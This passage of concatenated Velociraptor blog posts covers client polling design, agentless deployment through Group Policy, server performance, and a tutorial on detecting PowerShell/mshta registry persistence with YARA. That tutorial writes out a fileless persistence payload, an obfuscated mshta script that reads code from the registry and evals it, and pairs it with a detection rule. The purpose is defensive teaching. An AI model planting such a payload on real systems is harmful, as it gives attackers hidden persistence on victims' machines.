lived (most client polls carry no data) the client has to repeat the
polls periodically.

There are two parameters which determine how the GRR client behaves
-poll\_max and poll\_min. When there is some requests sent to the
client, the client will reduce its poll wait time to poll\_min (default
0.2 seconds). When nothing happens, the client will increase its poll
time gradually up to poll\_max (default 10 minutes).

Having long poll times means that any new flows launched on an idle
client must wait for up to 10 minutes before the client polls again in
order to send the new requests to the client. Unfortunately reducing the
poll\_max setting actually increases server load, as the server needs to
hit the database more often to serve each poll. This scheme essentially
poses a trade off - for a responsive client, we must have a low
poll\_max (i.e. more frequent polls) but this increases the load on the
frontend so it can not be too low.

When GRR is normally deployed it produces 2 types of clients on the web
interface: the debug client has max\_poll set to 5 seconds making
testing easier because it is more responsive, but the non-debug version
has max\_poll set to 10 minutes. For example at Velocidex, one of our
clients had once accidentally deployed the debug version and the server
was slammed with 5 second polls from several thousand clients! This
rendered the server useless, returning HTTP 500 status codes for most
client polls. The only way to recover was to push new config to the
clients and restart their GRR service in order to lower the poll
frequency and recover control over the deployment.

Catastrophic failure under load
===============================

The other problem with GRR\'s client communication protocol is that it
tends to exhibit catastrophic failure under load. When the client makes
a HTTP POST operation, the server goes through the following steps in
order:

1.  Unpack and decrypts any replies the client sends in its POST message
2.  Queue these replies on a worker queue
3.  Read the client\'s job queue for any outstanding requests to the
    client.
4.  Pack and encrypt these requests to the client.
5.  Write them as the body response of the HTTP POST with hopefully a
    200 HTTP status.

In previous posts we have seen that GRR\'s overuse of queuing leads to
extreme loads on the database, so under load (e.g. when a large hunt is
taking place), the above process may take some time until the server can
obtain a lock on the database row, write and read the messages, and
compose its response.

What tends to happen under load, is that the client will time the
request out if the server takes too long, or the server itself may
timeout the request with a HTTP 500 code. The client, thinking it has
not got through will try to POST the same data again (this time it will
wait longer though).

This essentially makes things worse, because the replies are probably
already mostly queued so the next retry will re-queue the same requests
(these will be discarded by the worker anyway but they are still
queued), increasing database pressure and server load. This manifests in
a critical meltdown of the frontends who pretty soon serve mostly 500
errors (making things worse again).

This is the reason why resource provision is so important with GRR, if
the frontends are just too slow to be able to keep up, the connections
will start to timeout, and load increases (rather than decreases)
causing a catastrophic failure.

How can we fix this?
====================

The main problem with a polling scheme is that the user experience is
terrible - even if we reduce the poll wait times to few seconds, users
will have to wait to view the results of their actions - leading to an
overall experience of a slow and sluggish system. For a responsive user
interface we need to have client round trips of a second or less and
having poll\_max set this low will just use up too many resources. This
is particularly noticeable in the VFS browser since it takes so long to
navigate to the desired directory and download files interactively.

Other endpoint monitoring systems use distributed pub/sub systems like
RabbitMQ or Firebase realtime database to inform the clients of new
requests. In those systems, the client makes a TCP connection to an
endpoint and holds the connection open for long periods of time, the
server can then immediately push new requests to the client as soon as
they are published. This seems like the way to go but we did not want to
introduce another dependency on Velociraptor (we really like it being a
self contained - working out of the box binary).

In particular we also wanted to solve the catastrophic failure we saw
with GRR clients under load (described above). This means that we need
to make sure that the clients are not sending data faster than the
server can process it. We definitely want to avoid the POST timing out
with a 500 error and the client retrying the same POST since this is the
main cause for the catastrophic failures we experienced with GRR.

We can do this by keeping the client\'s connection open for as long as
we need, but in order to not time it out, we send the HTTP status code
immediately, then process the POST data, while sending the client
keepalive data periodically using HTTP chunked transfer encoding.

To the client, and any proxies in the way, it simply looks like the POST
request was received immediately, and the response body is downloaded
slowly (there is always some pad data flowing so none of the TCP or HTTP
timers are triggered since the connection is always active). This is
illustrated in the diagram below.

![](comms2.png)

This scheme has the two main advantages:

1.  By returning a 200 status to the client before we begin processing,
    the client knows we received the data. They are then able to
    de-queue these messages and will not transmit them again.
2.  By keeping the client connected while the server is processing the
    request we avoid any additional data from being sent to the server
    while it is busy. The client will be blocked on the HTTP connection
    and will actually pause its running VQL query while the server is
    processing the current responses. This mechanism actually throttles
    the clients to allow the server to keep up.

Making the client more responsive
---------------------------------

We really wanted to make clients more responsive. We were frankly sick
of having to wait up to 10 minutes to access a client that we knew was
online in our IR work. To make the client more responsive we wanted to
use the same technique to keep the client connection open for long
periods of time, and then send instructions to the client as soon as the
user issues a new flow.

In the GRR scheme new requests are sent on the same connections as
client replies are received. This won\'t work if the client connection
is held open for long periods of time because while the client is
blocked reading new responses from the server, it can not send any
replies (the POST header was already sent).

To fix this we switched to two separate POST connections on two server
handlers, a reader handler and a writer handler. The writer handler only
receives messages from the client to the server (i.e. replies to client
requests), while the reader handler blocks the client for prolonged time
and sends client requests as soon as new flows are launched.

This scheme allows a full duplex, responsive communication protocol,
with no polling overheads. This can be seen in the diagram below.

![](comms3.png)

The client establishes the reader channel by sending a HTTP POST request
to the reader handler. The server checks for any messages for the
client, and sees that there are none pending. It will then keep the
client\'s connection open as before, trickle sending pad data (using
HTTP chunked transfer encoding) to keep the connection open for as long
as possible.

When the user launches a new flow, the server can immediately forward
the client\'s requests on the open channel, completing the POST
operation. The client will then process the requests and send the
responses with a separate HTTP POST to the writer channel. In the
meantime the reader channel will re-POST to the reader handler and
become blocked and ready for the next request.

This scheme has the following advantages:

1.  The user\'s flow is executed instantly by the client. This makes for
    example, the VFS browser instant - as soon as the user clicks the
    \"refresh directory listing\" button, the directory is refreshed. As
    soon as the user wants to view a file, the file is downloaded etc.
2.  There is hardly any polling activity. The clients open a reader
    connection once and hold it for many minutes. The server need only
    check the queue at the beginning of the connection and then only if
    it knows there is a new flow launched for this client. This means
    server load is really low.

However, the scheme also has some disadvantages:

1.  TCP connections are held for long periods of time tying up server
    resources. In particular the open sockets count towards the
    process\'s open file descriptor limit. It is typically necessary to
    increase this limit (by default it is 1024 which is very low).
2.  Deploying over multiple servers is a bit more complex because a
    client may be blocked on one server and the flow is launched on
    another server. Velociraptor now has a notification API to allow
    inter server RPCs to propagate notifications between servers.

We believe that these limitations can be easily managed. They are no
different from typical limitations of large scale pub/sub systems (they
too need to hold many TCP connections open). In our testing we have not
seen a problem scaling to many thousands of connected clients with very
low resource use.

Velociraptor now also has a pool client that allows spinning up several
thousand clients at the same time. This helps with testing a deployment
to make sure it can handle the increased open file limit and test how
large scale hunts can be handled.

Conclusions
-----------

The new responsive client communications protocol allows for near
instantaneous access to clients. This actually reduces the overall load
on the system because we do not need to perform frequent client polls
just to check if a new flow is launched. User experience is much better
as users can interact with clients immediately.

---END OF FILE---

======
FILE: /content/blog/html/2018/09/29/detecting_powershell_persistence_with_velociraptor_and_yara/_index.md
======
---
date: 2018-09-29T04:10:06Z
description: |
  I was watching the SANS DFIR Summit 2018 videos on YouTube and came
  across Mari DeGrazia's talk titled "Finding and Decoding Malicious
  Powershell Scripts"

title: Detecting powershell persistence with Velociraptor and Yara
categories: ["Blog"]
---

{{% notice warning %}}

This page is written about a very old version of Velociraptor and is
retained for historical purposes.

{{% /notice %}}

I was watching the SANS DFIR Summit 2018 videos on YouTube and came
across Mari DeGrazia\'s talk titled [\"Finding and Decoding Malicious
Powershell Scripts\"](https://www.youtube.com/watch?v=JWC7fzhvAY8). This
is an excellent talk and it really contains a wealth of information. It
seems that Powershell is really popular these days, allowing attacker to
\"live off the land\" by installing fully functional reverse shells and
backdoors, in a few lines of obfuscated scripts.

Mari went through a number of examples and also expanded on some in her
blog post [Malicious PowerShell in the Registry:
Persistence](http://az4n6.blogspot.com/2018/06/malicious-powershell-in-registry.html),
where she documents persistence through an autorun key launching
powershell to execute a payload within another registry key.

A similar persistence mechanism is documented by David Kennedy from
Binary defence in his post [PowerShell Injection with Fileless Payload
Persistence and Bypass
Techniques](https://blog.binarydefense.com/powershell-injection-diskless-persistence-bypass-techniques).
In that case an msha.exe link was stored in the user\'s Run key which
executed a payload from another registry key.

I was eager to write a Velociraptor artifact to attempt to detect such
keys using a YARA signature. Of course signature based detection is not
as robust as behavioural analysis but it is quick and usually quite
effective.

I thought it was still quite instructive to document how one can develop
the VQL queries for a simple Velociraptor artifact. We will be
developing the artifact interactively on a Windows system.

Preparation
===========

Our artifact will attempt to detect the persistence mechanism detailed
in the above posts. We start by adding a value to our test user account
under the key

``` {.sourceCode .console}
Key: "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
Value: "C:\Windows\system32\mshta.exe"
Data:
  about:<script>c1hop="X642N10";R3I=new%20ActiveXObject("WScript.Shell");
  QR3iroUf="I7pL7";k9To7P=R3I.RegRead("HKCU\\software\\bkzlq\\zsdnhepyzs");
  J7UuF1n="Q2LnLxas";eval(k9To7P);JUe5wz3O="zSfmLod";</script>
```

Defining the Artifact.
======================

We create a directory called \"artifacts\" then create a new file inside
it called powershell\_persistence.yaml. Velociraptor artifacts are just
YAML files that can be loaded at runtime using the \--definitions flag.

Every artifact has a name, by convention the name is separated into its
major categories. We will call ours Windows.Persistence.Powershell:

``` {.sourceCode .yaml}
name: Windows.Persistence.Powershell
```

This is the minimum required for Velociraptor to identify it. We can see
a listing of all artifacts Velociraptor knows about using the
\"artifacts list\" command:

``` {.sourceCode .console}
F:\>velociraptor.exe --definitions artifacts artifacts list
INFO:2018/09/28 07:59:40 Loaded 34 built in artifacts
Linux.Applications.Chrome.Extensions
Linux.Applications.Chrome.Extensions.Upload
…
Windows.Persistence.Powershell
...
Windows.Sys.Users
```

We can collect the artifact simply by using the \"artifacts collect\"
command:

``` {.sourceCode .console}
F:\>velociraptor.exe --definitions artifacts artifacts collect Windows.Persistence.Powershell
INFO:2018/09/28 20:01:32 Loaded 34 built in artifacts
```

Ok so Velociraptor can load and collect this new artifact, but as yet it
does nothing! We need to think about what exactly we want to collect.

We know we want to search for all values in the Run/RunOnce hive of all
the users. Let\'s first see if we can retrieve all the values using a
glob:

``` {.sourceCode .yaml}
name: Windows.Persistence.Powershell
parameters:
  - name: keyGlob
    default: "HKEY_USERS\\*\\Software\\Microsoft\\Windows\
    \\CurrentVersion\\{Run,RunOnce}\\*"
sources:
 - precondition:
    SELECT OS from info() where OS = "windows"
   queries:
   - |
    SELECT FullPath from glob(
       globs=keyGlob,
       accessor="reg"
    )
```

This artifact demonstrates a few concepts:

1.  We can define parameters by name, and reference them from within the
    VQL query. This keeps the VQL query clean and more readable.
2.  We can define a precondition on the artifact. If the precondition is
    not met, the VQL query will not be run.

Lets run this artifact:

``` {.sourceCode .console}
F:\>velociraptor.exe --definitions artifacts artifacts collect Windows.Persistence.Powershell
INFO:2018/09/28 20:51:47 Loaded 34 built in artifacts
+--------------------------------+
|            FullPath            |
+--------------------------------+
| HKEY_USERS\S-1-5-19\Software\M |
| icrosoft\Windows\CurrentVersio |
| n\Run\OneDriveSetup            |
| HKEY_USERS\S-1-5-20\Software\M |
| icrosoft\Windows\CurrentVersio |
| n\Run\OneDriveSetup            |
| HKEY_USERS\S-1-5-21-546003962- |
| 2713609280-610790815-1001\Soft |
| ware\Microsoft\Windows\Current |
| Version\Run\"C:\Windows\system |
| 32\mshta.exe"                  |
+--------------------------------+
Artifact:
Windows.Persistence.Powershell
```

It returns a couple of results so there are two Run/RunOnce values
defined. For this artifact, we only want to return those entries which
match a specific yara signature. We can work later on improving the yara
signature, but for now let\'s just detect uses of the eval() powershell
command within 500 characters of an ActiveXObject instantiation. We will
try to match each value returned from the Run keys with this object:

``` {.sourceCode .yaml}
name: Windows.Persistence.Powershell
parameters:
  - name: keyGlob
    default: "HKEY_USERS\\*\\Software\\Microsoft\\Windows\
             \\CurrentVersion\\{Run,RunOnce}\\*"
  - name: yaraRule
    default: |
      rule Powershell {
        strings:
        $ = /ActiveXObject.{,500}eval/ nocase
        $ = /ActiveXObject.{,500}eval/ wide nocase
        condition:
        any of them
      }
sources:
 - precondition:
    SELECT OS from info() where OS = "windows"
   queries:
   - |
     // This is a stored query
     LET file = SELECT FullPath from glob(
       globs=keyGlob,
       accessor="reg"
     )
   - |
     SELECT * FROM yara(
       rules=yaraRule,
       files=file.FullPath,   // This will expand to a list of paths.
       accessor="reg")
```

This version recovers the FullPath of all the Run/RunOnce values and
stores them in a stored query. We then issue another query that applies
the yara rule on these values:

``` {.sourceCode .console}
F:\>velociraptor.exe --definitions artifacts artifacts collect Windows.Persistence.Powershell
INFO:2018/09/28 21:29:10 Loaded 34 built in artifacts
+------------+------+------+--------------------------------+--------------------------------+
|    Rule    | Meta | Tags |            Strings             |              File              |
+------------+------+------+--------------------------------+--------------------------------+
| Powershell |      |      | {"Name":"$","Offset":40,"HexDa | {"FullPath":"HKEY_USERS\\S-1-5 |
|            |      |      | ta":["00000000  41 63 74 69 76 | -21-546003962-2713609280-61079 |
|            |      |      |  65 58 4f  62 6a 65 63 74 28 2 | 0815-1001\\Software\\Microsoft |
|            |      |      | 2 57  |ActiveXObject(\"W|","00 | \\Windows\\CurrentVersion\\Run |
|            |      |      | 000010  53 63 72 69 70 74 2e 5 | \\\"C:\\Windows\\system32\\msh |
|            |      |      | 3  68 65 6c 6c 22 29 3b 51  |S | ta.exe\"","Type":"SZ","Data":{ |
|            |      |      | script.Shell\");Q|","00000020   | "type":"SZ","value":"about:\u0 |
|            |      |      | 52 33 69 72 6f 55 66 3d  22 49 | 03cscript\u003ec1hop=\"X642N10 |
|            |      |      |  37 70 4c 37 22 3b  |R3iroUf=\ | \";R3I=new%20ActiveXObject(\"W |
|            |      |      | "I7pL7\";|","00000030  6b 39 5 | Script.Shell\");QR3iroUf=\"I7p |
|            |      |      | 4 6f 37 50 3d 52  33 49 2e 52  | L7\";k9To7P=R3I.RegRead(\"HKCU |
|            |      |      | 65 67 52 65  |k9To7P=R3I.RegRe | \\\\software\\\\bkzlq\\\\zsdnh |
|            |      |      | |","00000040  61 64 28 22 48 4 | epyzs\");J7UuF1n=\"Q2LnLxas\"; |
|            |      |      | b 43 55  5c 5c 73 6f 66 74 77  | eval(k9To7P);JUe5wz3O=\"zSfmLo |
|            |      |      | 61  |ad(\"HKCU\\\\softwa|","00 | d\";\u003c/script\u003e"},"Mti |
|            |      |      | 000050  72 65 5c 5c 62 6b 7a 6 | me":{"sec":1538191253,"usec":1 |
|            |      |      | c  71 5c 5c 7a 73 64 6e 68  |r | 538191253231489700},"Ctime":{" |
|            |      |      | e\\\\bkzlq\\\\zsdnh|","0000006 | sec":1538191253,"usec":1538191 |
|            |      |      | 0  65 70 79 7a 73 22 29 3b  4a | 253231489700},"Atime":{"sec":1 |
|            |      |      |  37 55 75 46 31 6e 3d  |epyzs\ | 538191253,"usec":1538191253231 |
|            |      |      | ");J7UuF1n=|","00000070  22 51 | 489700}}                       |
```

We can see that the last query returns 5 columns, but each column
actually contains objects with quite a lot of additional information.
For example, the File column returns information about the file that
matched the yara rule (its filename, timestamps etc). The output is a
bit confusing so we just return the relevant columns. We can replace the
\* in the last query with a curated list of columns to return:

``` {.sourceCode .sql}
SELECT File.FullPath as ValueName, File.Data.value as Contents,
  timestamp(epoch=File.Mtime.Sec) as ModTime
FROM yara(rules=yaraRule,
          files=file.FullPath,
          accessor="reg")
```

Which results in the quite readable:

``` {.sourceCode .console}
F:\>velociraptor.exe --definitions artifacts artifacts collect Windows.Persistence.Powershell
INFO:2018/09/28 21:42:18 Loaded 34 built in artifacts
+--------------------------------+--------------------------------+---------------------------+
|           ValueName            |            Contents            |          ModTime          |
+--------------------------------+--------------------------------+---------------------------+
| HKEY_USERS\S-1-5-21-546003962- | about:<script>c1hop="X642N10"; | 2018-09-28T20:20:53-07:00 |
| 2713609280-610790815-1001\Soft | R3I=new%20ActiveXObject("WScri |                           |
| ware\Microsoft\Windows\Current | pt.Shell");QR3iroUf="I7pL7";k9 |                           |
| Version\Run\"C:\Windows\system | To7P=R3I.RegRead("HKCU\\softwa |                           |
| 32\mshta.exe"                  | re\\bkzlq\\zsdnhepyzs");J7UuF1 |                           |
|                                | n="Q2LnLxas";eval(k9To7P);JUe5 |                           |
|                                | wz3O="zSfmLod";</script>       |                           |
+--------------------------------+--------------------------------+---------------------------+
Artifact: Windows.Persistence.Powershell
```

Great! This works and only returns values that match the yara signature
we developed.

Testing the artifact
====================

Let\'s test this artifact for real now. We restart the frontend with the
\--definition flag and this makes the new artifact available in the GUI
under the Artifact Collector flow. The GUI also shows the entire
artifact we defined so we can see what VQL will be run:

![image](powershell1.png)

Launching the flow appears to work and shows exactly the same result as
we collected on the command line:

![image](powershell2.png)

But wait! There is a problem!
=============================

When we log out of the machine, and then rerun the artifact it returns
no results!

![image](powershell3.png)

Why is that? Experienced incident responders would recognize that any
artifact that works from the `HKEY_USERS` registry hive is inherently
unreliable. This is because the `HKEY_USERS` hive is not a real hive -it
is a place where Windows mounts the user\'s hive when the user logs in.

How does `HKEY_USERS` hive work?
-------------------------------

Windows implements the concept of user profiles. Each user has a
personal registry hive that stores user specific settings. It is
actually a file stored on their home directory called ntuser.dat. When a
user logs into the workstation, the file may be synced from the domain
controller and then it is mounted under the `HKEY_USERS\<sid>`
registry hive.

This means that when the user logs out, their user registry hive is
unmounted and does not appear in `HKEY_USERS` any longer. Any artifacts
based around the `HKEY_USERS` hive will work only if the collection is
run when a user is logged in.

This is obviously not what we want when we hunt for persistence! We want
to make sure that none of the users on the system have this persistence
mechanism installed. You can imagine a case where a system has been
cleaned up but then a user logs into the machine, thereby reinfecting
it!

How to fix this?
----------------

Yara is a very powerful tool because it allows us to search for patterns
in amorphous data (such as process memory and structured files) without
having to fully understand the structure of the data we are searching
for. Of course this has its limitations, but yara can raise a red flag
if the signature matches the file, and we can analyse this file more
carefully later.

In this case, we can not rely on globbing the `HKEY_USER` registry hive,
so maybe we can just search the files that back these hives? We know
that each user on the system has an NTUSER.DAT file in their home
directory (usually C:\\\\Users\\\\\<username\>), so let\'s write an
artifact to find these files. We can reuse the artifact
Windows.Sys.Users that reports all user accounts on a system (we display
it as JSON to enhance readability):

``` {.sourceCode .console}
F:\>velociraptor.exe artifacts collect Windows.Sys.Users --format json
INFO:2018/09/28 22:44:26 Loaded 34 built in artifacts
{
 "Description": "",
 "Directory": "C:\\Users\\test",
 "Gid": 513,
 "Name": "test",
 "Type": "local",
 "UUID": "S-1-5-21-546003962-2713609280-610790815-1001",
 "Uid": 1001
},
{
 "Description": "",
 "Directory": "C:\\Users\\user1",
 "Gid": 513,
 "Name": "user1",
 "Type": "local",
 "UUID": "S-1-5-21-546003962-2713609280-610790815-1003",
 "Uid": 1003
},
```

So we just want to YARA scan the NTUSER.DAT file in each home directory:

``` {.sourceCode .console}
SELECT * from foreach(
row={
   SELECT Name, Directory as HomeDir
     FROM Artifact.Windows.Sys.Users()
    WHERE Directory.value and Gid
},
query={
  SELECT File.FullPath As FullPath,
         Strings.Offset AS Off,
         Strings.HexData As Hex,
          upload(file=File.FullPath, accessor="ntfs") AS Upload
      FROM yara(
            files="\\\\.\\" + HomeDir + "\\ntuser.dat",
            accessor="ntfs",
            rules=yaraRule, context=10)
      })
```

This query:

1.  Selects all the usernames and their home directory from the
    Windows.Sys.Users artifact.
2.  For each directory prepends \\\\\\\\.\\\\ and appends
    \"ntuser.dat\". For example c:\\\\Users\\\\test becomes
    \\\\\\\\.\\\\c:\\\\Users\\\\test\\\\NTUSER.dat
3.  The file is accessed using the NTFS filesystem accessor. This is
    necessary because the registry hive is locked if the user is logged
    in. Therefore we must access it using raw NTFS parsing to bypass the
    OS locking.
4.  For each file that matches the yara expression, we upload the file
    to the server for further analysis.

Lets run this new artifact on the server:

![image](powershell5.png)

Unlike the previous artifact, this one simply returns the YARA hit, but
because we do not have any context on which value contained the
signature, or even if it had been deleted. Luckily we uploaded the raw
registry hive for further analysis, and we can use a tool such as
RegRipper to extract more information from the hive:

``` {.sourceCode .console}
$ wine rip.exe -p user_run -r
/tmp/velociraptor/clients/C.c916a7e445eb0868/uploads/F.078739d6/ntfs/
%5C%5C.%5CC%3A%5CUsers%5Cuser1%5CNTUSER.DAT
Launching user_run v.20140115
user_run v.20140115
(NTUSER.DAT) [Autostart] Get autostart key contents from NTUSER.DAT hive

Software\Microsoft\Windows\CurrentVersion\Run
LastWrite Time Thu Sep 27 01:19:08 2018 (UTC)
 OneDrive: "C:\Users\user1\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
   /background
 c:\windows\system32\mshta.exe: about:<script>c1hop="X642N10";
   R3I=new%20ActiveXObject("WScript.Shell");
   QR3iroUf="I7pL7";k9To7P=R3I.RegRead("HKCU\\software\\
   bkzlq\\zsdnhepyzs");J7UuF1n="Q2LnLxas";eval(k9To7P);JUe5wz3O="zSfmLod";</script>
```

Note above how we can simply retrieve the uploaded file from
Velociraptor\'s filestore. Velociraptor stores uploaded files on the
filesystem within the flow\'s directory.

Conclusions
-----------

In this blog post we saw how to utilize YARA to find suspicious
powershell persistence mechanisms. YARA is a powerful tool and using
Velociraptor\'s artifacts we can apply it to files, registry values, and
raw NTFS files such as locked registry hives and the pagefile.

We also saw some of the inherent problems with relying on the
`HKEY_USERS` registry hive for detection - the hive is only present when
a user is logged in so when we hunt, we might miss those users who are
currently logged out. We saw how YARA can be used to detect suspicious
patterns in raw registry hive files and how artifacts may retrieve those
files for further analysis.

---END OF FILE---

======
FILE: /content/blog/html/2019/03/02/agentless_hunting_with_velociraptor/_index.md
======
---
date: 2019-03-02T04:10:06Z
description:  |
  There has been a lot of interest lately in "Agentless hunting"
  especially using PowerShell.  This blog post explores an agentless
  deployment scenario, where we do not want to install Velociraptor
  permanently on the end point, but rather push it to end points
  temporarily to collect specific artifacts.

title: Agentless hunting with Velociraptor
categories: ["Blog"]
---


There has been a lot of interest lately in Agentless hunting especially
using PowerShell. There are many reasons why Agentless hunting is
appealing - there are already a ton of endpoint agents and yet another
one may not be welcome. Sometimes we need to deploy endpoint agents as
part of a DFIR engagement and we may not want to permanently install yet
another agent on end points.

This blog post explores an agentless deployment scenario, where we do
not want to install Velociraptor permanently on the end point, but
rather push it to end points temporarily to collect specific artifacts.
The advantage of this method is that there are no permanent changes to
the end point, as nothing is actually installed. However, we do get the
full power of Velociraptor to collect artifacts, hunt for evil and
more\...

Agentless Velociraptor
======================

Normally when deploying Velociraptor as a service, the binary is copied
to the system and a service is installed. The service ensures that the
binary is restarted when the system reboots, and so Velociraptor is
installed on a permanent basis.

However in the agentless deployment scenario we simply run the binary
from a network share using group policy settings. The downside to this
approach is that the endpoint needs to be on the domain network to
receive the group policy update (and have the network share accessible)
before it can run Velociraptor. When we run in Agentless mode we are
really after collecting a bunch of artifacts via hunts and then exiting
- the agent will not restart after a reboot. So this method is suitable
for quick hunts on corporate (non roaming) assets.

In this post I will use Windows 2019 Server but this should also work on
any older version.

Creating a network share
------------------------

The first step is to create a network share with the Velociraptor binary
and its configuration file. We will run the binary from the share in
this example, but for more reliability you may want to copy the binary
into e.g. a temp folder on the end point in case the system becomes
disconnected from the domain. For quick hunts though it should be fine.

We create a directory on the server (I will create it on the domain
controller but you should probably not do that - find another machine to
host the share).

![](1.png)

I created a directory C:\\\\Users\\\\Deployment and ensured that it is
read only. I have shared the directory as the name Deployment.

I now place the Velociraptor executable and client config file in that
directory and verify that I can run the binary from the network share.
The binary should be accessible via
\`\\\\\\\\DC\\Deployment\\velociraptor.exe\`:

![](2.png)

Creating the group policy object.
---------------------------------

Next we create the group policy object which forces all domain connected
machines to run the Velociraptor client. We use the Group Policy
Management Console:

![](3.png)

Select the OU or the entire domain and click \"Create New GPO\":

![](4.png)

Now right click the GPO object and select \"Edit\":

![](5.png)

We will create a new scheduled task. Rather than schedule it at a
particular time, we will select to run it immediately. This will force
the command to run as soon as the endpoint updates its group policy
settings (i.e. we do not want to wait for the next reboot of the
endpoint).

![](6.png)

Next we give the task a name and a description. In order to allow
Velociraptor to access raw devices (e.g. to collect memory or NTFS
artifacts) we can specify that the client will run at
NT\_AUTHORITY\\\\SYSTEM privileges, and run without any user being
logged on. It is also worth ticking the \"hidden\" checkbox here to
prevent a console box from appearing.

![](7.png)

Next click the Actions tab and add a new action. This is where we launch
the Velociraptor client. The program will simply be launched from the
share (i.e. \\\\\\\\\\\\\\\\DC\\\\Deployment\\\\velociraptor.exe) and we
give it the arguments allowing it to read the provided configuration
file (i.e.
\--config \\\\\\\\\\\\\\\\DC\\\\Deployment\\\\client.config.yaml client -v).

![](8.png)

In the setting tab we can control how long we want the client to run.
For a quick hunt this may be an hour or two but maybe for a DFIR
engagement it might be a few days. The GPO will ensure the client is
killed after the allotted time.

![](9.png)

Once the GPO is installed it becomes active for all domain machines. You
can now schedule any hunts you wish using the Velociraptor GUI. When a
domain machine refreshes its group policy it will run the client, which
will enroll and immediately participate in any outstanding hunts - thus
collecting and delivering its artifacts to the server. After the
allotted time has passed, the client will shut down without having
installed anything on the endpoint.

You can force a group policy update by running the gpupdate program. Now
you can verify that Velociraptor is running:

![](10.png)

Persistence
-----------

Note that when running Velociraptor in agent less mode you probably want
to configure it so that the writeback file is written to the temp
directory. The writeback file is how the client keeps track of its key
material (and identity). The default is to store it in the client\'s
installation folder, but you should probably change it in the client\'s
config file:

``` {.sourceCode .yaml}
Client:
  writeback_windows: $TEMP\\velociraptor.writeback.yaml
```

The file will remain in the client\'s temp directory so if you ever
decide to run the agentless client again (by pushing another group
policy) the client id remains the same.

---END OF FILE---

======
FILE: /content/blog/html/2019/02/10/velociraptor_performance/_index.md
======
---
date: 2019-02-10T04:10:06Z
description: "We are often asked how many resources does a Velociraptor deployment
use? How should one spec a machine for a Velociraptor deployment?"
title: "Velociraptor Performance"
categories: ["Blog"]
---


We are often asked how many resources does a Velociraptor deployment
use? How should one spec a machine for a Velociraptor deployment?

We have previously said that one of the reasons we developed
Velociraptor was to improve on the performance of GRR which was not
scalable for our use case.

We have been working with the team at Klein & Co. on several
intrusions over the past several months, which are providing valuable
opportunities to deploy and test Velociraptor in a range of real world
investigation scenarios. Through this process, we have been able to
extend Velociraptor's functionality and prove its performance on real
client networks.

I thought I would write a short blog post to show how Velociraptor
performed on such a recent engagement. In this engagement we deployed
Velociraptor on AWS and selectively pushed the client to around 600
machines running a mix of MacOS and Windows.

This post will hopefully give readers some idea of how scalable the tool
is and the typical workloads we run with it.

The Server
==========

Since this is a smallish deployment we used a single VM with 32Gb of RAM
and 8 cores. This was definitely over speced for this job as most of the
time the server consumed less than 10% of one core:

``` {.sourceCode .console}
top - 06:26:13 up 29 days,  2:31,  5 users,  load average: 0.00, 0.01, 0.05
Tasks: 214 total,   1 running, 213 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.5 us,  0.1 sy,  0.0 ni, 99.4 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem:  32948060 total, 14877988 used, 18070072 free,   411192 buffers
KiB Swap:        0 total,        0 used,        0 free. 13381224 cached Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
19334 root      20   0 1277924  94592  12616 S   3.0  0.3   9:11.03 ./velociraptor --config server.config.yaml frontend
    8 root      20   0       0      0      0 S   0.3  0.0   7:16.30 [rcuos/0]
```

You can see that the server consumed about 95mb when operating normally
and CPU usage was around 3% of one core.

For this engagement we knew that we would be collecting a lot of data
and so we specified a large 500gb volume.

Hunt performance
================

Velociraptor works by collecting \"Artifacts\" from clients. Artifacts
are simply encapsulated VQL queries which specify something to search
for on the endpoint. Without going into the details of this engagement,
we can say that we collected typical artifacts for a DFIR/Forensic
investigation engagement. In the following I want to explore how well
hunts performed for the following typical artifacts in order of
complexity:

1.  Search the filesystem for a file glob.
2.  Download the \$MFT from the root filesystem.
3.  Run a Yara scan over every file on all mounted filesystems.

We ran these artifact collections over a large number of hosts (between
400-500) that fell within the scope of our engagement. Although the
number of hosts is not huge, we hope to demonstrate Velociraptor\'s
scalability.

Searching for a file glob
=========================

One of the simplest and most common tasks in DFIR is to search the
filesystem for a glob based on filename. This requires traversing
directories and matching the filename based on the user specified
expression - for example, find all files with the extension \*.exe
within the C:\\\\Users directory.

Velociraptor can glob over the entire filesystem or over a limited set
of files. Typically a full filesystem glob can take some minutes on the
endpoint (it is equivalent to running the find unix command) and touches
every file. We typically try to limit the scope of the glob as much as
possible (e.g. only search system directories) but sometimes it is nice
to run a glob over all mounted filesystems to make sure we don\'t miss
anything. In this case we opted for a full filesystem scan.

We searched the entire deployment using a hunt (The hunt is constructed
using the File Finder flow in the GUI) which just launches the artifact
collection. Therefore the horizontal distance between the red and blue
dot, in the graph below, represents the total time taken by the host to
collect the artifact.

![image](FileNameSearch.svg)

The graph shows how many hosts were recruited into this hunt on the Y
axis. The X axis show the number of seconds since the hunt launch. The
red points indicate the time when clients started their collection,
while the blue dots indicate the time when the client completed the
artifact collection and the server saved its results.

The inset shows the same data but zoomed into the time origin.

Velociraptor improves and builds on the initial ideas implemented within
the GRR DFIR tool, and so it is interesting to compare this graph to a
typical graph produced by GRR\'s hunt (reproduced from [this
paper](https://www.sciencedirect.com/science/article/pii/S1742287613000285)).

![image](grr_hunt.png)

The first noticeable difference is that Velociraptor clients complete
their collection much faster than GRR\'s (the horizontal distance
between the red and blue dots represents the time between when the
collection is issued and the time it completes).

The main reason for this is that GRR\'s communication protocol relies on
polling (by default every 10 minutes). Also, since hunting is so
resource intensive in GRR, the clients actually poll the hunt foreman
task every 30 minutes by default. This means that GRR clients typically
have to wait up to 30 minutes to run a hunt!

The second difference is the slope of the line around the start of the
hunt. GRR implements a hunt client rate - clients are recruited into the
hunt slowly (by default 20 per minute) in order to limit the load on the
frontends. Unlike GRR, Velociraptor does not implement a hunt rate since
the Velociraptor frontend load is controlled by limiting concurrency
instead (more on this below).

This means that Velociraptor can deliver useful results within seconds
of the hunt starting. We see that this particular filename search
typically takes 25-30 seconds and we see about 200 clients completing
the hunt within this time consistently. The remaining clients are
probably not online and they receive the hunt as they join the network.
This makes Velociraptor hunts far more responsive and useful.

You might also notice a few outliers which spend a long time collecting
this artifact - these machines have probably been shutdown or suspended
while collecting this artifact.

MFT Download
============

A common technique is to examine the Master File Table (MFT) of an NTFS
volume. By forensically analyzing the MFT it is possible to detect
deleted files, time stomping and build a timeline of the system using
